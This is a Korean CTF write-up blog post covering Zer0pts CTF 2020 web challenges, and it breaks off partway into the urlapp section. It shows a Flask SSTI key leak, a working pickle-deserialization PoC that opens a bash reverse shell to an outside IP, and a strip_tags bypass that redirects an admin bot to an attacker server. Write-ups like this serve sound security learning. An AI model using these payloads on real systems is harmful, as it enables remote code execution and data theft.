<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1006일본의 zer0pts 팀에서 주관한 CTF입니다.[332pts] notepad (1st solve)notepad.tar.gzThis notepad is more useful than Windows one, right?Flask SSTI and pickle Unserialize 를 주제로 한 문제입니다.1"><meta property="og:type" content="article"><meta property="og:title" content="Zer0pts CTF 2020"><meta property="og:url" content="https://blog.p6.is/zer0pts-CTF-2020/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1006일본의 zer0pts 팀에서 주관한 CTF입니다.[332pts] notepad (1st solve)notepad.tar.gzThis notepad is more useful than Windows one, right?Flask SSTI and pickle Unserialize 를 주제로 한 문제입니다.1"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.p6.is/img/2020/03/image-20200309084922019.png"><meta property="og:image" content="https://blog.p6.is/img/2020/03/image-20200309090320124.png"><meta property="og:image" content="https://blog.p6.is/img/2020/03/image-20200309090554181.png"><meta property="article:published_time" content="2020-03-09T09:22:11.000Z"><meta property="article:modified_time" content="2020-04-17T05:34:57.701Z"><meta property="article:author" content="posix"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.p6.is/img/2020/03/image-20200309084922019.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>Zer0pts CTF 2020</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul></ul></span><br><span id="actions"><ul><li><a class="icon" href="/Python-SSTI-exploitable-classes/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/Web-Security-CheatSheet/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/zer0pts-CTF-2020/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/zer0pts-CTF-2020/&text=Zer0pts CTF 2020"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#332pts-notepad-1st-solve"><span class="toc-number">1.</span> <span class="toc-text">[332pts] notepad (1st solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#653pts-MusicBlog-2nd-solve"><span class="toc-number">2.</span> <span class="toc-text">[653pts] MusicBlog (2nd solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#435pts-urlapp"><span class="toc-number">3.</span> <span class="toc-text">[435pts] urlapp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#755pts-phpNantokaAdmin"><span class="toc-number">4.</span> <span class="toc-text">[755pts] phpNantokaAdmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#345pts-Can-you-guess-it-2nd-solve"><span class="toc-number">5.</span> <span class="toc-text">[345pts] Can you guess it (2nd solve)</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">Zer0pts CTF 2020</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-03-09T09:22:11.000Z" itemprop="datePublished">2020-03-09</time></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><ul><li><a href="https://ctftime.org/event/1006" target="_blank" rel="noopener">https://ctftime.org/event/1006</a></li></ul><p><img src="/img/2020/03/image-20200309084922019.png" alt="image-20200309084922019"></p><p>일본의 <strong>zer0pts</strong> 팀에서 주관한 CTF입니다.</p><h2 id="332pts-notepad-1st-solve"><a href="#332pts-notepad-1st-solve" class="headerlink" title="[332pts] notepad (1st solve)"></a>[332pts] notepad (1st solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/notepad_d0fde3493051f54a1a2286bf40e948c0.tar.gz" target="_blank" rel="noopener">notepad.tar.gz</a></li></ul><blockquote><p>This notepad is more useful than Windows one, right?</p></blockquote><p>Flask SSTI and pickle Unserialize 를 주제로 한 문제입니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="string">""" Automatically go back when page is not found """</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">"Referer"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">'/'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">'/'</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL=&#123;&#125;"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'</span>.format(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 페이지 렌더링에 사용되는 <code>page_not_found</code> 함수에서는 Referer 값을 인자로 하여 문자열을 구성해<br>flask의 <code>render_template_string</code> 함수로 전달하고 있습니다.</p><p>따라서 SSTI 에 취약하며, <code>{{config}}</code> 값을 삽입하는 것으로 서버의 시크릿 키을 알아낼 수 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Request</span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: 3.112.201.75:8001</span><br><span class="line">Referer: http://3.112.201.75:8001/?&#123;&#123;config&#125;&#125;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">// Response</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Refresh"</span> <span class="attr">content</span>=<span class="string">"3;URL=http://3.112.201.75:8001/?&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None&#125;&gt;"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>Page not found. Redirecting...<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>위와 같은 요청을 통해 <code>SECRET_KEY</code> 가 <code>b&#39;\\\xe4\xed}w\xfd3\xdc\x1f\xd72\x07/C\xa9I&#39;</code>라는 것을 알아냈으므로, session 값을 자유롭게 조작할 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">...</span><br><span class="line"><span class="meta">@app.route('/note/&lt;int:nid&gt;', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span><span class="params">(nid=<span class="number">0</span>)</span>:</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; len(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">'index.html'</span>, data=data, nid=nid)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">""" Load saved notes """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">'savedata'</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">"date"</span>: now(), <span class="string">"text"</span>: <span class="string">""</span>, <span class="string">"title"</span>: <span class="string">"*New Note*"</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>pickle unserialize 가 실행되는 곳은 <code>load</code> 함수로 세션에서 <code>savedata</code> 값을 가져와 base64 복호화 한 후 <code>pickle.loads</code> 를 실행하고 있습니다.</p><p>따라서 savedata 값을 조작해준 후, load 함수를 호출하는 <code>/note/&lt;int:nid&gt;</code> 경로를 요청하면 됩니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> os, sys, pickle, base64, requests</span><br><span class="line"></span><br><span class="line">COMMAND = <span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1'"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.secret_key = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">app = App()  </span><br><span class="line">app.secret_key = <span class="string">b'\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I'</span></span><br><span class="line"></span><br><span class="line">si = SecureCookieSessionInterface()</span><br><span class="line">serializer = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">session = serializer.dumps(&#123;<span class="string">'savedata'</span>:base64.b64encode(pickle.dumps(PickleRce()))&#125;)</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">'http://3.112.201.75:8001/note/1'</span>, cookies = &#123;</span><br><span class="line">    <span class="string">'session'</span>: session</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>위는 pickle unserialize 를 이용해 rce를 하는 poc입니다.</p><h2 id="653pts-MusicBlog-2nd-solve"><a href="#653pts-MusicBlog-2nd-solve" class="headerlink" title="[653pts] MusicBlog (2nd solve)"></a>[653pts] MusicBlog (2nd solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/MusicBlog_637545797ab8638bffd877d7be2ec045.tar.gz" target="_blank" rel="noopener">MusicBlog.tar.gz</a></li></ul><blockquote><p>You can introduce favorite songs to friends with <strong>MusicBlog</strong>!</p></blockquote><p>분류를 정하기 힘든 문제인데, client side attack 입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">'zer0pts&#123;&lt;censored&gt;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#like'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure><p>주어진 소스에서 worker.js 를 확인해 보면 페이지가 작성되면 관리자가 게시글에 들어가 like 버튼을 누른 후 봇이 종료됨을 확인할 수 있습니다.</p><p>플래그는 관리자의 user-agent 값에 포함되어 있네요.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce = get_nonce();</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-$&#123;nonce&#125;' 'strict-dynamic'; base-uri 'none'; trusted-types"</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br></pre></td></tr></table></figure><p>서버에는 csp 가 걸려있어, 외부로 요청을 보낼 수 없습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [[URL]] → &lt;audio src="URL"&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>본 문제의 중요한 부분은 여기입니다.<br>게시글 작성 중에 사용되는 필터링 함수에서는, <code>strip_tags</code> 함수를 사용하고 있는데 본 함수에 존재하는 취약점을 통해 문제를 해결할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strip_tags(<span class="string">'&lt;a/udio&gt;'</span>, <span class="string">'&lt;audio&gt;'</span>));</span><br><span class="line"><span class="comment">// string(8) "&lt;a/udio&gt;"</span></span><br></pre></td></tr></table></figure><p>audio 태그만 허용해야 하는 것이 정상이지만, strip_tags 는 태그 사이에 slash 가 들어가는 것을 허용하고 있습니다. 따라서 우리는 a 태그를 사용할 수 있게 됩니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"mt-4"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge badge-secondary"</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>            titie here          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>by posix <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge badge-love badge-pill"</span>&gt;</span>♥ 0<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mt-3"</span>&gt;</span></span><br><span class="line">        content here          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mt-3"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"like.php?id=5dfd06e9-741b-4fff-a3a5-4f5e8e79dac8"</span> <span class="attr">id</span>=<span class="string">"like"</span> <span class="attr">class</span>=<span class="string">"btn btn-love"</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>또한 content 가 들어가는 부분도 like 버튼보다 상위에 위치하고 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">udio</span> <span class="attr">id</span>=<span class="string">"like"</span> <span class="attr">href</span>=<span class="string">"http://rwx.kr:8888"</span>&gt;</span>x</span><br></pre></td></tr></table></figure><p>따라서 위와 같은 태그를 삽입해 주면, 공격자 서버로 접속하도록 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8888</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class="line">Connection from ec2-3-112-201-75.ap-northeast-1.compute.amazonaws.com 53510 received!</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: rwx.kr:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: zer0pts&#123;M4sh1m4fr3sh!!&#125;</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;challenge&#x2F;post.php?id&#x3D;2116dfe6-5cf1-459a-b575-cd59b08cdfa5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US</span><br></pre></td></tr></table></figure><h2 id="435pts-urlapp"><a href="#435pts-urlapp" class="headerlink" title="[435pts] urlapp"></a>[435pts] urlapp</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/urlapp_ddd9109207a713b8bcdc2a300bef27b6.tar.gz" target="_blank" rel="noopener">urlapp.tar.gz</a></li></ul><blockquote><p>application <a href="http://3.112.201.75:8004/" target="_blank" rel="noopener">here</a></p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'uri'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line">  sock = TCPSocket.open(<span class="string">"redis"</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ping(sock) <span class="keyword">then</span></span><br><span class="line">    exit</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sock</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(sock, cmd)</span></span></span><br><span class="line">  sock.write(cmd + <span class="string">"\r\n"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(sock)</span></span></span><br><span class="line">  data = sock.gets</span><br><span class="line">  <span class="keyword">if</span> data == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"+"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> data[<span class="number">1</span>..-<span class="number">1</span>].strip</span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"$"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">"$-1\r\n"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> sock.gets.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(sock)</span></span></span><br><span class="line">  query(sock, <span class="string">"ping"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"PONG"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">"SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"OK"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 